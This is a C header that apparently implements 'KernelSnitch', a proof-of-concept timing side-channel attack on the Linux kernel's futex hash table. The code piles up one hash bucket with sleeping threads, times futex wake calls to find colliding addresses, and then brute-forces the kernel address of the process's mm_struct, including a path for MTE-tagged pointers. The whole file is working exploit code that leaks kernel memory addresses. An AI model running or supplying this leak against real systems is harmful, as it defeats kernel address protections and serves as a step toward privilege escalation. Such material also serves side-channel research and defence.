#pragma once

#include "timeutils.h"
#include "utils.h"
#include "futex_hash.h"

#include <linux/futex.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <limits.h>

#define FUTEX_SZ (64ULL<<30)
#define FUTEX_MMAP_SZ (1ULL<<30)
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef KS_PAGE_SIZE
#define KS_PAGE_SIZE PAGE_SIZE
#endif
#ifndef APPENDED_FUTEXES
#define APPENDED_FUTEXES 4096
#endif
#define MULITPLE 4
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END (KERNELSNITCH_IDENTITY_START + (64ULL<<30))
#endif
#define IDENTITY_START KERNELSNITCH_IDENTITY_START
#define IDENTITY_END   KERNELSNITCH_IDENTITY_END
#define COARSE_SZ (1ULL << 30)
#define KERNELSNITCH_MAX_WINDOWS 8

struct kernelsnitch_identity_window {
    size_t start;
    size_t end;
};

static size_t kernelsnitch_parse_identity_windows(
    struct kernelsnitch_identity_window *windows, size_t capacity)
{
    const char *raw = getenv("KSNITCH_IDENTITY_WINDOWS");
    char *copy;
    char *save = NULL;
    char *item;
    size_t count = 0;

#ifdef KERNELSNITCH_IDENTITY_WINDOWS
    if (!raw || !*raw)
        raw = KERNELSNITCH_IDENTITY_WINDOWS;
#endif
    if (!raw || !*raw || !capacity)
        return 0;
    copy = strdup(raw);
    if (!copy)
        return 0;
    for (item = strtok_r(copy, ",", &save);
         item && count < capacity;
         item = strtok_r(NULL, ",", &save)) {
        char *dash = strchr(item, '-');
        char *start_end = NULL;
        char *end_end = NULL;
        unsigned long long start;
        unsigned long long end;

        if (!dash)
            continue;
        *dash = '\0';
        errno = 0;
        start = strtoull(item, &start_end, 0);
        end = strtoull(dash + 1, &end_end, 0);
        if (errno || start_end == item || *start_end ||
            end_end == dash + 1 || *end_end || start >= end)
            continue;
        windows[count].start = (size_t)start;
        windows[count].end = (size_t)end;
        count++;
    }
    free(copy);
    return count;
}

enum kernelsnitch_state {
    KERNELSNITCH_NOT_INIT = 0,
    KERNELSNITCH_INIT,
    KERNELSNITCH_COLLISIONS_FOUND,
    KERNELSNITCH_COLLISIONS_NOT_FOUND,
    KERNELSNITCH_MM_FOUND,
    KERNELSNITCH_MM_NOT_FOUND,
    KERNELSNITCH_LAST,
};

struct kernelsnitch_shared_state {
    volatile size_t mm_struct_sz;
    volatile size_t mm_slab_order;
    volatile size_t verbose;

    size_t collisions;
    size_t thread_cnt;
    size_t cpu_cnt;
    size_t futex_hash_table_size;
    size_t total_futexes;
    size_t appended_futexes;
    size_t repeat_measurement;
    size_t average;

    volatile unsigned char *futexes;
    volatile unsigned char inc_futex[KS_PAGE_SIZE];

    volatile size_t *futex_addrs;
    volatile size_t *times;
    volatile size_t found;
    volatile size_t mm_struct;

    pthread_t *tids;
    pthread_t *increase_tids;
    size_t increase_count;
    size_t increase_id;
    size_t identity_diff;

    enum kernelsnitch_state state;

    size_t threshold_mult;
    int mte_enabled;
};

#define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)

/**
 * FUTEX syscall
 */
static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout, unsigned int *uaddr2, unsigned int val3)
{
    return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

/**
 * Do a private futex wait to increase the hash bucket of futex_hash(ks->inc_futex[id], current->mm_struct)
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.id: identifier of the futex user-space address to be used for the increase
 */
struct inc_arg {
    struct kernelsnitch_shared_state *ks;
    size_t id;
};
static void *__do_increase(void *arg)
{
    struct inc_arg *inc_arg = (struct inc_arg *)arg;
    struct kernelsnitch_shared_state *ks = inc_arg->ks;
    size_t id = inc_arg->id;
    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
    free(inc_arg);
    return 0;
}

/**
 * Creates threads and put them to sleep to increase the chain of a hash bucket
 * @arg ks: shared KernelSnitch state
 * @arg id: identifier of the futex user-space address to be used for the increase
 * @arg amount: increase
 */
static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
{
    ks->increase_tids = calloc(amount, sizeof(*ks->increase_tids));
    ASSERT_pr((ks->increase_tids != NULL), "failed to allocate futex waiter ids\n");
    ks->increase_count = amount;
    ks->increase_id = id;
    for (size_t i = 0; i < amount; ++i) {
        struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
        inc_arg->id = id;
        inc_arg->ks = ks;
        SYSCHK(pthread_create(&ks->increase_tids[i], 0, __do_increase,
                              (void *)inc_arg));
    }
    WAIT();
    const char *wait_env = getenv("KSNITCH_WAIT_MS");
    if (wait_env && *wait_env) {
        char *wait_end = NULL;
        errno = 0;
        unsigned long parsed_wait = strtoul(wait_env, &wait_end, 0);
        if (!errno && wait_end != wait_env && !*wait_end && parsed_wait <= 10000)
            usleep(parsed_wait * 1000UL);
    }
}

static void __decrease(struct kernelsnitch_shared_state *ks)
{
    if (!ks->increase_tids)
        return;
    SYSCHK(__futex((unsigned int *)&ks->inc_futex[ks->increase_id],
                   FUTEX_WAKE_PRIVATE, INT_MAX, NULL, NULL, 0));
    for (size_t i = 0; i < ks->increase_count; ++i)
        SYSCHK(pthread_join(ks->increase_tids[i], NULL));
    free(ks->increase_tids);
    ks->increase_tids = NULL;
    ks->increase_count = 0;
}

/**
 * Simple compare
 */
#ifndef REPEAT_MEASUREMENT
#define REPEAT_MEASUREMENT 128
#endif
#ifndef AVERAGE
#define AVERAGE (1<<3)
#endif
static int __compare(const void *a, const void *b)
{
    return (*(size_t *)a - *(size_t *)b);
}

/**
 * Performs the non-destructive traversal of the hashbucket futex_hash(futex_addr, current->mm_struct)
 * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
 * @return averaged time of the futex wait operation
 */
static size_t __measure(
    struct kernelsnitch_shared_state *ks, size_t futex_addr)
{
    size_t t0;
    size_t t1;
    size_t time = 0;
    // do some simple signal processing and reject bad ones
    size_t __times[REPEAT_MEASUREMENT];
    for (size_t l = 0; l < ks->repeat_measurement; ++l) {
        sched_yield();
        t0 = rdtsc_begin();
        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
        t1 = rdtsc_end();
        __times[l] = t1 - t0;
    }
    qsort(__times, ks->repeat_measurement, sizeof(size_t), __compare);
    for (size_t l = 0; l < ks->average; ++l)
        time += __times[l];
    time /= ks->average;
    return time;
}

/**
 * Performs the bruteforce leak in the range [start, end]
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.range: range of the bruteforce attempt
 */
struct range {
    size_t id;
    size_t start;
    size_t end;
};
struct mm_leak_arg {
    struct kernelsnitch_shared_state *ks;
    struct range range;
};
static void *__mm_leak(void *arg)
{
    struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
    struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
    struct range *range = &mm_leak_arg->range;
    if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
    size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
    size_t tested = 0;
    size_t best_matches = 0;
    size_t best_candidate = (size_t)-1;
    size_t candidate_offset = 0;
    const char *offset_env = getenv("KSNITCH_MM_OFFSET");
    if (offset_env && *offset_env) {
        char *offset_end = NULL;
        errno = 0;
        unsigned long long parsed_offset =
            strtoull(offset_env, &offset_end, 0);
        if (!errno && offset_end != offset_env && !*offset_end &&
            parsed_offset < mm_slab_sz) {
            candidate_offset = (size_t)parsed_offset;
        }
    }
    for (size_t slab_addr = range->start;
         (slab_addr < range->end) && !ks->found;
         slab_addr += mm_slab_sz) {
            size_t slab_end = slab_addr + mm_slab_sz;
            if (slab_end > range->end)
                slab_end = range->end;
            for (size_t mm_struct_candidate = slab_addr + candidate_offset;
                 (mm_struct_candidate < slab_end) && !ks->found;
                 mm_struct_candidate += ks->mm_struct_sz) {
                tested++;

                size_t found_hash = 1;
                if (!ks->mte_enabled) {
                    // test the mm_struct candidate
                    size_t hash0 = futex_hash(ks->futex_addrs[0], mm_struct_candidate);
                    size_t matches = 0;
                    for (size_t i = 1; i < ks->collisions; ++i) {
                        if (hash0 == futex_hash(ks->futex_addrs[i], mm_struct_candidate))
                            matches++;
                    }
                    if (matches > best_matches) {
                        best_matches = matches;
                        best_candidate = mm_struct_candidate;
                    }
                    found_hash = matches == (ks->collisions - 1);
                    if (found_hash) {
                        ks->mm_struct = mm_struct_candidate;
                        ks->found = 1;
                        break;
                    }
                } else {
                    // need to set the tag if mte is enabled
                    for (size_t tag_candidate = 0; tag_candidate < 16 && !ks->found; ++tag_candidate) {
                        size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                        __mm_struct_candidate |= (tag_candidate << 56);
                        found_hash = 1;
                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
                        if (found_hash) {
                            if (ks->verbose)
                                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
                            ks->mm_struct = __mm_struct_candidate;
                            ks->found = 1;
                            break;
                        }
                    }
                }
            }
    }
    if (ks->verbose)
        pr_info("[% 3zd] done tested=%zu best_matches=%zu best=%016zx found=%zu\n",
                range->id, tested, best_matches, best_candidate, ks->found);
    free(mm_leak_arg);
    return 0;
}

/****************************************************************************************************************/
/* EXTERNAL FUNCTIONS                                                                                           */
/****************************************************************************************************************/

/**
 * Setup phase of KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return shared KernelSnitch state
 */
struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->mm_struct = -1;
    ks->mm_struct_sz = __mm_struct_sz;
    const char *stride_env = getenv("KSNITCH_MM_STRIDE");
    if (stride_env && *stride_env) {
        char *stride_end = NULL;
        errno = 0;
        unsigned long long parsed_stride =
            strtoull(stride_env, &stride_end, 0);
        if (!errno && stride_end != stride_env && !*stride_end &&
            parsed_stride >= 0x40 && parsed_stride <= 0x1000) {
            ks->mm_struct_sz = (size_t)parsed_stride;
        }
    }
    ks->mm_slab_order = __mm_slab_order;
    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
    ks->thread_cnt = __thread_cnt;
    ks->collisions = __collision_cnt;
    const char *collision_env = getenv("KSNITCH_COLLISIONS");
    if (collision_env && *collision_env) {
        char *collision_end = NULL;
        errno = 0;
        unsigned long long parsed_collisions =
            strtoull(collision_env, &collision_end, 0);
        if (!errno && collision_end != collision_env && !*collision_end &&
            parsed_collisions >= 2 && parsed_collisions <= 32) {
            ks->collisions = (size_t)parsed_collisions;
        }
    }
    ks->verbose = __verbose;
    ks->mte_enabled = __mte_enabled;
    ks->threshold_mult = 10;
    const char *threshold_env = getenv("KSNITCH_THRESHOLD");
    if (threshold_env && *threshold_env) {
      char *end = NULL;
      long parsed = strtol(threshold_env, &end, 0);
      if (!errno && end != threshold_env && !*end && parsed >= 1 &&
          parsed <= 1000) {
        ks->threshold_mult = (size_t)parsed;
      }
    }
    ks->appended_futexes = APPENDED_FUTEXES;
    const char *appended_env = getenv("KSNITCH_APPENDED");
    if (appended_env && *appended_env) {
        char *appended_end = NULL;
        errno = 0;
        unsigned long parsed_appended =
            strtoul(appended_env, &appended_end, 0);
        if (!errno && appended_end != appended_env && !*appended_end &&
            parsed_appended >= 16 && parsed_appended <= 8192) {
            ks->appended_futexes = parsed_appended;
        }
    }
    ks->repeat_measurement = REPEAT_MEASUREMENT;
    ks->average = AVERAGE;

    // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
    ks->futex_hash_table_size = 256*ks->cpu_cnt;
    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
    ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
    for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
        SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
    ks->identity_diff = ((IDENTITY_END - IDENTITY_START)/ks->thread_cnt);

    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));

    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
        ks->cpu_cnt,
        ks->mm_struct_sz,
        ks->mm_slab_order,
        ks->thread_cnt,
        ks->collisions,
        ks->mte_enabled ? "enabled" : "disabled");
    pin_to_core(0);
    futex_init();
    const char *hash_size_env = getenv("KSNITCH_HASH_SIZE");
    if (hash_size_env && *hash_size_env) {
        char *hash_size_end = NULL;
        errno = 0;
        unsigned long long parsed_hash_size =
            strtoull(hash_size_env, &hash_size_end, 0);
        if (!errno && hash_size_end != hash_size_env && !*hash_size_end &&
            parsed_hash_size >= 2 &&
            (parsed_hash_size & (parsed_hash_size - 1)) == 0) {
            futex_hashsize = parsed_hash_size;
        }
    }

    ks->state = KERNELSNITCH_INIT;
    return ks;
}

void kernelsnitch_set_profile(
    struct kernelsnitch_shared_state *ks, size_t appended_futexes,
    size_t repeat_measurement, size_t average)
{
    ASSERT_pr((appended_futexes > 0), "invalid appended futex count\n");
    ASSERT_pr((repeat_measurement > 0 &&
               repeat_measurement <= REPEAT_MEASUREMENT),
              "invalid measurement count\n");
    ASSERT_pr((average > 0 && average <= repeat_measurement),
              "invalid measurement average\n");
    ks->appended_futexes = appended_futexes;
    const char *appended_env = getenv("KSNITCH_APPENDED");
    if (appended_env && *appended_env) {
        char *appended_end = NULL;
        errno = 0;
        unsigned long parsed_appended =
            strtoul(appended_env, &appended_end, 0);
        if (!errno && appended_end != appended_env && !*appended_end &&
            parsed_appended >= 16 && parsed_appended <= 8192) {
            ks->appended_futexes = parsed_appended;
        }
    }
    ks->repeat_measurement = repeat_measurement;
    ks->average = average;
}

/**
 * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
{
    #define ID 128
#ifndef KERNELSNITCH_THRESHOLD_MULT
#define KERNELSNITCH_THRESHOLD_MULT 10
#endif
    size_t count = 0;
    size_t wanted;
    size_t futex_addr;
    size_t id;
    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
    wanted = ks->collisions - 1;

    size_t approx_samples[8];
    for (size_t approx_index = 0; approx_index < 8; ++approx_index)
        approx_samples[approx_index] = MIN(
            __measure(ks, (size_t)&ks->futexes[0]),
            __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
    qsort(approx_samples, 8, sizeof(size_t), __compare);
    size_t approx_time = approx_samples[1];
    if (ks->verbose)
        pr_info("approx_time=%zd threshold=%zd (x%zd)\n",
                approx_time, approx_time*ks->threshold_mult,
                ks->threshold_mult);

    // piled-up hash bucket ID 128
    // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
    __increase(ks, ID, ks->appended_futexes);
    if (ks->verbose) pr_info("start finding collisisons\n");
    int target_window = getenv("KSNITCH_TARGET_WINDOW") != NULL;
    int validate_collisions = getenv("KSNITCH_VALIDATE_COLLISIONS") != NULL;
    size_t pile_time = 0;
    size_t candidate_count = 0;
    size_t candidate_cap = wanted;
    size_t candidate_addrs[64];
    size_t candidate_times[64];
    if (validate_collisions) {
        candidate_cap *= 8;
        if (candidate_cap > 64)
            candidate_cap = 64;
    }

    // find futex user space address which collide with the piled-up hash bucket ID 128
    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
    if (ks->verbose || target_window) {
        pile_time = __measure(ks, ks->futex_addrs[0]);
        if (ks->verbose)
            pr_info("pile_time=%zd\n", pile_time);
    }
    for (size_t i = 2; i < ks->total_futexes &&
                    (validate_collisions ? candidate_count < candidate_cap :
                                           count < wanted);
         ++i) {
        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
        if (id >= FUTEX_SZ)
            break;
        futex_addr = (size_t)&ks->futexes[id];
        ks->times[i] = __measure(ks, futex_addr);
        int is_collision = ks->times[i] > (approx_time*ks->threshold_mult);
        if (target_window && pile_time) {
            is_collision = ks->times[i] > pile_time / 2 &&
                           ks->times[i] < pile_time * 2;
        }
        if (is_collision) {
            if (validate_collisions) {
                candidate_addrs[candidate_count] = futex_addr;
                candidate_times[candidate_count] = ks->times[i];
                candidate_count++;
            } else {
                count++;
                ks->futex_addrs[count] = futex_addr;
            }
            if (ks->verbose) pr_info("  %016zx (t=%zd)\n", futex_addr, ks->times[i]);
        }
    }
    if (validate_collisions) {
        __decrease(ks);
        for (size_t i = 0; i < candidate_count && count < wanted; ++i) {
            size_t after = __measure(ks, candidate_addrs[i]);
            int pile_backed = after < candidate_times[i] / 2;
            if (ks->verbose)
                pr_info("  validate %016zx before=%zd after=%zd backed=%d\n",
                        candidate_addrs[i], candidate_times[i], after,
                        pile_backed);
            if (pile_backed) {
                count++;
                ks->futex_addrs[count] = candidate_addrs[i];
            }
        }
    }
    if (wanted == count) {
        if (ks->verbose) pr_info("found %zd collisisons\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    } else {
        pr_warning("only found %zd collisions -> cannot continue\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
    }
    if (ks->verbose && !validate_collisions)
        pr_info("pile_time_late=%zd\n",
                __measure(ks, ks->futex_addrs[0]));
    if (!validate_collisions)
        __decrease(ks);
}
size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND), "wrong state\n");
    return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
}

/**
 * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
{
    struct kernelsnitch_identity_window windows[KERNELSNITCH_MAX_WINDOWS];
    size_t window_count;
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
    if (ks->verbose) pr_info("start bruteforcing\n");
    reset_cpu_pin();
    window_count = kernelsnitch_parse_identity_windows(
        windows, KERNELSNITCH_MAX_WINDOWS);
    if (!window_count) {
        windows[0].start = IDENTITY_START;
        windows[0].end = IDENTITY_END;
        window_count = 1;
    }
    const char *identity_start_env = getenv("KSNITCH_IDENTITY_START");
    const char *identity_end_env = getenv("KSNITCH_IDENTITY_END");
    if (identity_start_env && identity_end_env) {
        char *start_end = NULL;
        char *end_end = NULL;
        errno = 0;
        unsigned long long parsed_start =
            strtoull(identity_start_env, &start_end, 0);
        unsigned long long parsed_end =
            strtoull(identity_end_env, &end_end, 0);
        if (!errno && start_end != identity_start_env && !*start_end &&
            end_end != identity_end_env && !*end_end &&
            parsed_start < parsed_end) {
            windows[0].start = (size_t)parsed_start;
            windows[0].end = (size_t)parsed_end;
            window_count = 1;
        }
    }
    if (ks->verbose) {
        pr_info("identity windows=%zu\n", window_count);
        for (size_t i = 0; i < window_count; ++i)
            pr_info("identity window[%zu] [%016zx-%016zx]\n",
                    i, windows[i].start, windows[i].end);
    }

    for (size_t i = 0; i < ks->thread_cnt; ++i) {
        size_t window_id = i % window_count;
        size_t part_id = i / window_count;
        size_t parts = (ks->thread_cnt + window_count - 1) / window_count;
        size_t span = windows[window_id].end - windows[window_id].start;
        size_t range_start = windows[window_id].start +
            (span * part_id) / parts;
        size_t range_end = windows[window_id].start +
            (span * (part_id + 1)) / parts;
        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
        mm_leak_arg->ks = ks;
        mm_leak_arg->range.id = i;
        mm_leak_arg->range.start =
            (range_start + (KS_PAGE_SIZE << ks->mm_slab_order) - 1) &
            ~((KS_PAGE_SIZE << ks->mm_slab_order) - 1);
        mm_leak_arg->range.end = range_end &
            ~((KS_PAGE_SIZE << ks->mm_slab_order) - 1);
        if (mm_leak_arg->range.end <= mm_leak_arg->range.start) {
            free(mm_leak_arg);
            ks->tids[i] = 0;
            continue;
        }
        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
    }
    for (size_t i = 0; i < ks->thread_cnt; ++i) {
        if (ks->tids[i])
            pthread_join(ks->tids[i], 0);
    }
    ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
}

/**
 * Cleanup phase for KernelSnitch
 * @arg ks: shared KernelSnitch state
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
    munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
    ks->times = 0;
    munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
    ks->tids = 0;
    munmap((void *)ks->futex_addrs, sizeof(size_t)*(ks->collisions + 1));
    ks->futex_addrs = 0;
    munmap((void *)ks->futexes, FUTEX_SZ);
    ks->futexes = 0;
    size_t ret = ks->mm_struct;
    if (ks->verbose) pr_info("done\n");
    munmap(ks, sizeof(struct kernelsnitch_shared_state));
    return ret;
}
